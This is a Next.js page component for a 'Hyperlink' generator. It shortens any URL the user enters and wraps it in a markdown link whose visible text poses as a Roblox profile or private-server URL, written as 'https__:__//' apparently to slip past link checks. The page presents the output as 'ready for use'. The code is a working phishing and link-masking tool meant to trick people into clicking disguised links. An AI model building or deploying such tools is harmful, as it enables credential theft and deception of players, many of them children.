"use client"

import type React from "react"
import { useState, useRef, useEffect } from "react"
import Link from "next/link"
import { ArrowLeft, RefreshCcw, Copy, Check, Link2, ExternalLink, Shield, AlertTriangle } from "lucide-react"
import { shortenUrl } from "../actions/shorten-url"
import { HyperlinkProtection } from "./protection-client"

type LinkType = "profile" | "private"

export default function HyperlinkPage() {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [linkType, setLinkType] = useState<LinkType>("profile")
  const [url, setUrl] = useState("")
  const [result, setResult] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)

  // Canvas background effect (same as main page but with purple particles)
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext("2d")
    if (!ctx) return

    try {
      const updateSize = () => {
        canvas.width = window.innerWidth
        canvas.height = window.innerHeight
      }
      updateSize()
      window.addEventListener("resize", updateSize)

      const particles: { x: number; y: number; speed: number; size: number; opacity: number }[] = []
      const particleCount = window.innerWidth < 640 ? 80 : 160

      for (let i = 0; i < particleCount; i++) {
        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          speed: 0.2 + Math.random() * 0.3,
          size: 0.5 + Math.random() * 1.5,
          opacity: 0.3 + Math.random() * 0.7,
        })
      }

      let animationFrameId: number

      function animate() {
        if (!ctx || !canvas) return

        ctx.clearRect(0, 0, canvas.width, canvas.height)

        particles.forEach((particle) => {
          // Use purple color for particles
          ctx.fillStyle = `rgba(139, 92, 246, ${particle.opacity})`
          ctx.beginPath()
          ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2)
          ctx.fill()

          particle.y += particle.speed
          if (particle.y > canvas.height) {
            particle.y = 0
            particle.x = Math.random() * canvas.width
          }
        })

        animationFrameId = requestAnimationFrame(animate)
      }

      animate()

      return () => {
        window.removeEventListener("resize", updateSize)
        cancelAnimationFrame(animationFrameId)
      }
    } catch (error) {
      console.error("Canvas error:", error)
    }
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError(null)
    setResult(null)
    setCopied(false)

    try {
      const formData = new FormData()
      formData.append("url", url)
      const response = await shortenUrl(formData)

      if (response.success) {
        // Format based on link type
        let formattedResult = ""
        if (linkType === "profile") {
          formattedResult = `[https__:__//www.roblox.com/users/3095250/profile](${response.shortUrl})`
        } else {
          formattedResult = `[https_:_//www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server](${response.shortUrl})`
        }
        setResult(formattedResult)
      } else {
        setError(response.error || "Failed to shorten URL")
      }
    } catch (err) {
      setError("An error occurred. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const copyToClipboard = () => {
    if (result) {
      navigator.clipboard.writeText(result)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <>
      <HyperlinkProtection />
      <div className="min-h-screen bg-black text-white relative overflow-hidden flex items-center justify-center py-4 sm:py-8 px-2 sm:px-4">
        <canvas ref={canvasRef} className="absolute inset-0 pointer-events-none" />

        <div className="relative z-10 w-full max-w-md">
          <div className="flex justify-between items-center mb-6">
            <Link
              href="/"
              className="flex items-center text-purple-400 hover:text-white transition-colors gap-1 bg-black/40 px-3 py-1.5 rounded-md border border-purple-500/20 hover:border-purple-500/40 relative overflow-hidden group"
            >
              <ArrowLeft className="w-4 h-4 relative z-10" />
              <span className="relative z-10">Back</span>
              <div className="shine-animation absolute inset-0 bg-gradient-to-r from-transparent via-purple-500/20 to-transparent opacity-0 group-hover:opacity-100"></div>
            </Link>
            <h1 className="text-2xl font-bold text-center text-white purple-glow flex items-center gap-2">
              <Link2 className="text-purple-400 w-5 h-5" />
              Hyperlink
            </h1>
            <div className="w-20"></div> {/* Spacer for alignment */}
          </div>

          {result && (
            <div className="mb-6">
              <div className="p-4 bg-black/60 border border-purple-500/30 rounded-md shadow-lg purple-glow-container">
                <div className="flex justify-between items-center mb-3">
                  <h3 className="text-sm font-medium text-purple-400 flex items-center gap-2">Generated Hyperlink:</h3>
                  <button
                    onClick={copyToClipboard}
                    className="text-xs text-purple-400 hover:text-purple-300 flex items-center gap-1 bg-black/40 px-2 py-1 rounded border border-purple-500/30 hover:border-purple-500/50 relative overflow-hidden group"
                  >
                    {copied ? (
                      <>
                        <Check className="w-3 h-3 relative z-10" />
                        <span className="relative z-10">Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3 relative z-10" />
                        <span className="relative z-10">Copy</span>
                      </>
                    )}
                    <div className="shine-animation absolute inset-0 bg-gradient-to-r from-transparent via-purple-500/20 to-transparent opacity-0 group-hover:opacity-100"></div>
                  </button>
                </div>
                <div className="text-sm font-mono break-all bg-black/80 p-3 rounded border border-gray-700 text-white">
                  {result}
                </div>

                <div className="mt-3 flex justify-between items-center">
                  <div className="flex items-center gap-1 text-xs text-green-400">
                    <Shield className="w-3 h-3" />
                    <span>Link ready for use</span>
                  </div>
                  <a
                    href={result.split("](")[1].slice(0, -1)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs text-purple-400 hover:text-white flex items-center gap-1 bg-black/40 px-2 py-1 rounded border border-purple-500/30 hover:border-purple-500/50 relative overflow-hidden group"
                  >
                    <ExternalLink className="w-3 h-3 relative z-10" />
                    <span className="relative z-10">Test Link</span>
                    <div className="shine-animation absolute inset-0 bg-gradient-to-r from-transparent via-purple-500/20 to-transparent opacity-0 group-hover:opacity-100"></div>
                  </a>
                </div>
              </div>
            </div>
          )}

          <div className="border border-purple-500/30 rounded-xl p-6 bg-black/40 purple-glow-container">
            <div className="mb-6">
              <label htmlFor="linkType" className="block text-sm text-purple-400 mb-2 font-medium">
                Select Link Type
              </label>
              <div className="relative">
                <select
                  id="linkType"
                  className="w-full bg-black/60 border border-purple-500/30 rounded-md p-3 text-white appearance-none focus:outline-none focus:ring-2 focus:ring-purple-500/50 focus:border-purple-500/50"
                  value={linkType}
                  onChange={(e) => setLinkType(e.target.value as LinkType)}
                >
                  <option value="profile">Profile Link</option>
                  <option value="private">Private Link</option>
                </select>
                <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                  <svg
                    className="w-4 h-4 text-purple-400"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path>
                  </svg>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit}>
              <div className="mb-6">
                <label htmlFor="url" className="block text-sm text-purple-400 mb-2 font-medium">
                  Enter Your Link
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <Link2 className="h-5 w-5 text-gray-400" />
                  </div>
                  <input
                    type="url"
                    id="url"
                    value={url}
                    onChange={(e) => setUrl(e.target.value)}
                    placeholder="https://example.com"
                    className="w-full bg-black/60 border border-purple-500/30 rounded-md py-3 pl-10 pr-3 text-white focus:outline-none focus:ring-2 focus:ring-purple-500/50 focus:border-purple-500/50"
                    required
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={isLoading || !url}
                className="w-full bg-gradient-to-r from-purple-900/50 to-black text-white px-4 py-3 rounded-md text-lg font-semibold text-center transition-all duration-300 flex items-center justify-center gap-2 hover:from-purple-800/50 hyperlink-button border border-purple-500/30 relative overflow-hidden group disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <>
                    <RefreshCcw className="w-5 h-5 animate-spin relative z-10" />
                    <span className="relative z-10">Generating...</span>
                  </>
                ) : (
                  <>
                    <Link2 className="text-purple-400 w-5 h-5 relative z-10" />
                    <span className="relative z-10">Generate Hyperlink</span>
                  </>
                )}
                <div className="shine-animation absolute inset-0 bg-gradient-to-r from-transparent via-purple-500/20 to-transparent opacity-0 group-hover:opacity-100"></div>
              </button>
            </form>

            {error && (
              <div className="mt-4 p-3 bg-red-900/30 border border-red-800 rounded-md text-red-200 text-sm flex items-start gap-2">
                <AlertTriangle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                <span>{error}</span>
              </div>
            )}
          </div>
        </div>

        <style jsx global>{`
          .purple-glow {
            text-shadow: 0 0 10px rgba(139, 92, 246, 0.7), 0 0 20px rgba(139, 92, 246, 0.5);
          }

          .purple-glow-container {
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
            animation: purple-pulse 4s infinite alternate;
          }

          @keyframes purple-pulse {
            0% {
              box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
            }
            100% {
              box-shadow: 0 0 25px rgba(139, 92, 246, 0.5);
            }
          }

          .hyperlink-button {
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.3);
            position: relative;
            overflow: hidden;
            z-index: 1;
            transition: all 0.3s ease;
          }

          .hyperlink-button:hover {
            box-shadow: 0 0 25px rgba(168, 85, 247, 0.6);
            text-shadow: 0 0 5px rgba(168, 85, 247, 0.7);
            transform: translateY(-2px);
          }

          .hyperlink-button::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at center, rgba(168, 85, 247, 0.3) 0%, transparent 70%);
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: -1;
          }

          .hyperlink-button:hover::before {
            opacity: 1;
          }

          @keyframes shine {
            0% {
              transform: translateX(-100%) rotate(15deg);
            }
            20% {
              transform: translateX(100%) rotate(15deg);
            }
            100% {
              transform: translateX(100%) rotate(15deg);
            }
          }

          .shine-animation {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
              to right,
              transparent 0%,
              rgba(255, 255, 255, 0.1) 50%,
              transparent 100%
            );
            transform: translateX(-100%) rotate(15deg);
            transition: none;
          }

          .group:hover .shine-animation {
            animation: shine 1.5s ease;
            opacity: 1;
          }
        `}</style>
      </div>
    </>
  )
}
